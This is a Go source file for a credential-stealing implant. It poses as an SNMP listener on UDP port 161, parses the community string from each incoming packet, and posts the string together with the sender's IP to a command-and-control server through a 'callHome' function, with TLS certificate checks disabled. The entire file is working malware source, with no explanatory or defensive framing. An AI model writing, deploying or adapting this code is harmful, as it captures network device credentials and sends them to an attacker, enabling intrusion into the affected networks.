package main

import (
	"crypto/tls"
	"net"
	"net/http"
	"net/url"
	"time"
	"bytes"
)

var (
	c2Server string
)

func httpsClient() *http.Client {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{
                                InsecureSkipVerify: true,
                        },
                },
                Timeout: time.Second * 10,
        }
        return client
}

func getRequest(path string) error {
        client := httpsClient()
        resp, err := client.Get("https://" + path)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        return nil
}

func callHome(form url.Values) (error) {
        client := httpsClient()
        _ = getRequest(c2Server)
        formBody := bytes.NewBufferString(form.Encode())
        resp, err := client.Post("https://" + c2Server, "application/x-www-form-urlencoded", formBody)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        return nil
}


func comString() {
	pc, err := net.ListenPacket("udp", ":161")
	if err != nil {
		return
	}
	defer pc.Close()

	for {
		buf := make([]byte, 1024)
		n, addr, err := pc.ReadFrom(buf)
		if err != nil {
			continue
		}

		count := 0
		trigger := false
		commString := []byte{}
		trigger2 := false

		for _, line := range buf[:n] {
			asInt := int(line)
			if count > 0 {
				commString = append(commString, line)
				count -= 1
				if count == 0 {
					break
				}
			}
			if trigger == true {
				count = asInt
				trigger = false
			}

			if asInt == 4 && trigger2 != true {
				trigger = true
				trigger2 = true
			}

		}
		form := url.Values {
			"connection": {"SNMP"},
			"remote_ip": {addr.String()},
			"com_string": {string(commString)},
		}
		_ = callHome(form)
	}

}

func main() {
	comString()
}
